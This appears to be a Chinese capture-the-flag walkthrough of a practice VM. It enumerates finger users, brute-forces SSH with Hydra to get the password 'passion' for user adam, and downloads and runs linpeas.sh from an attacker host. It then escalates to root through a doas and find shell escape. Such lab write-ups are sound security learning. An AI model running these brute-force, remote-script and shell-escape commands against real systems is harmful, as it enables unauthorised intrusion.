# 复盘*

## 靶机地址

[Proton Drive](https://drive.proton.me/urls/X6CBKJWTQC#BKNmfYEwUCOT)

![image-20250321161652928](assets/image-20250321161652928.png)



## 信息收集

### nmap扫描

#### 准备阶段

```
mkdir nmapscan
```

![image-20250321161838246](assets/image-20250321161838246.png)

新建文件夹用来存放nmap扫描结果



#### 主机探测

![image-20250321161815310](assets/image-20250321161815310.png)

确定靶机ip：

192.168.1.17



#### 端口扫描

```
nmap -sT -p- --min-rate 10000 192.168.1.17 -oA ./nmapscan/ports
```

![image-20250321161929634](assets/image-20250321161929634.png)

开放了：

- 22 ssh
- 79 finger
- 80 http



#### 提取端口信息

```
ports
```

![image-20250321162026683](assets/image-20250321162026683.png)

![image-20250321162043194](assets/image-20250321162043194.png)



#### 详细结果扫描

```
nmap -sT -sC -sV -O -p 22,79,80 192.168.1.17 -oA ./nmapscan/detail
```

![image-20250321162109914](assets/image-20250321162109914.png)

分析：

- 22 ssh OpenSSH 8.4p1
- 79 finger
- 80 http Apache httpd 2.4.56



### 79端口

#### 利用nc测试用户信息

```
nc 192.168.1.17 79
asd
nc 192.168.1.17 79
root
```

![image-20250321162233317](assets/image-20250321162233317.png)

当用户不存在时，会提示没有这个用户

当用户存在时，会显示用户信息

也就是我们可以利用脚本遍历用户字典，然后发送nc请求





#### 也可以用msfconsole

```
msfconsole
search finger
use 10
show options
set rhosts 192.168.1.17
set UsERS_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt
set THREADS 50
run
```

![image-20250321163327882](assets/image-20250321163327882.png)

![image-20250321163334052](assets/image-20250321163334052.png)

![image-20250321163347726](assets/image-20250321163347726.png)

枚举用户名

![image-20250321163400351](assets/image-20250321163400351.png)

![image-20250321163414611](assets/image-20250321163414611.png)

![image-20250321163524911](assets/image-20250321163524911.png)

得到用户

- adam



### 80端口

#### 访问192.168.1.17

![image-20250321163700301](assets/image-20250321163700301.png)

apache主页

查看源码，无信息



#### 目录扫描

```
dirsearch -u http://192.168.1.17
```

![image-20250321163651173](assets/image-20250321163651173.png)

无结果



#### gobuster扫描

```
gobuster dir -u http://192.168.1.17 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt
```

![image-20250321163919565](assets/image-20250321163919565.png)

无结果



### 22 端口

#### 尝试hydra爆破密码

```
hydra -l adam -P /usr/share/seclists/Passwords/probable-v2-top12000.txt ssh://192.168.1.17
```

![image-20250321164307347](assets/image-20250321164307347.png)

得到：

```
adam:passion
```



#### ssh登录

```
ssh adam@192.168.1.17
```

![image-20250321164347684](assets/image-20250321164347684.png)



## 提权

### 得到第一个flag

```
ls
cat user.txt
```

![image-20250321164435892](assets/image-20250321164435892.png)



### 查看用户信息

```
cat /etc/passwd
```

![image-20250321164455238](assets/image-20250321164455238.png)

只有这一个普通用户



### 执行sudo -l

![image-20250321164526255](assets/image-20250321164526255.png)



### suid文件查找

```
find / -perm -4000 2>/dev/null
```

![image-20250321164603271](assets/image-20250321164603271.png)

存在doas





### 上传linpeas.sh

```
wget 192.168.1.3/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![image-20250321164910971](assets/image-20250321164910971.png)

![image-20250321164959235](assets/image-20250321164959235.png)

即adam用户允许利用doas作为root用户执行find命令



### find提权

```
doas -u root /usr/bin/find . -exec /bin/sh \;
```

![image-20250321165317267](assets/image-20250321165317267.png)



### 得到第二个flag

```
cd /root
ls
cat root.txt
```

![image-20250321165341723](assets/image-20250321165341723.png)